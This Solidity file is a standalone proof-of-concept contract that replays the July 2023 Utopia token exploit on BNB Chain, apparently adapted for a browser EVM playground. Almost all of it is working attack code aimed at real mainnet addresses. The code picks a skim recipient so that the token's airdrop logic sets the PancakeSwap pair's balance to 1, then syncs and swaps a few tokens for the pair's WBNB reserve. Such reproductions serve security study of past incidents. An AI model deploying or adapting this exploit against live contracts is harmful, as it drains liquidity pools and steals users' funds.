// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-Utopia).
//
// The registry PoC runs the exploit inline in a Foundry Test contract and uses
// deal() to seed itself with 0.01 WBNB. The browser EVM has no cheatcodes, so the
// config mirrors that deal() with setup.dealToken and deploys this self-contained
// contract instead. The attack logic below is the same sequence from
// test/2023-07-Utopia_exp.sol.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUtopia is IERC20 {
    function lastAirdropAddress() external view returns (address);
}

interface IPancakeRouter {
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) external pure returns (uint256 amountOut);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract ContractTest {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant UTOPIA = 0xb1da08C472567eb0EC19639b1822F578d39F3333;
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair constant PAIR = IPancakePair(0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5);

    function testExploit() external {
        IERC20(WBNB).approve(address(ROUTER), type(uint256).max);
        IERC20(UTOPIA).approve(address(ROUTER), type(uint256).max);

        wbnbToUtopia();
        IERC20(UTOPIA).transfer(address(PAIR), 1);

        // Choose the skim recipient so Utopia._airdrop() resolves back to PAIR
        // and overwrites the pair's token balance to 1.
        uint256 seed = (uint160(IUtopia(UTOPIA).lastAirdropAddress()) | uint160(block.number))
            ^ uint160(address(PAIR))
            ^ uint160(address(PAIR));
        address notRandomAirdropAddr = address(uint160(seed | 1));

        PAIR.skim(notRandomAirdropAddr);
        PAIR.sync();
        IERC20(UTOPIA).transfer(address(PAIR), 1);
        PAIR.sync();
        utopiaToWbnb();
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {}

    function wbnbToUtopia() internal {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = UTOPIA;
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(WBNB).balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
    }

    function utopiaToWbnb() internal {
        (uint256 reserveUtopia, uint256 reserveWBNB,) = PAIR.getReserves();
        uint256 amountOut = ROUTER.getAmountOut(32, reserveUtopia, reserveWBNB);
        IERC20(UTOPIA).transfer(address(PAIR), 32);
        PAIR.swap(0, amountOut, address(this), new bytes(1));
    }
}
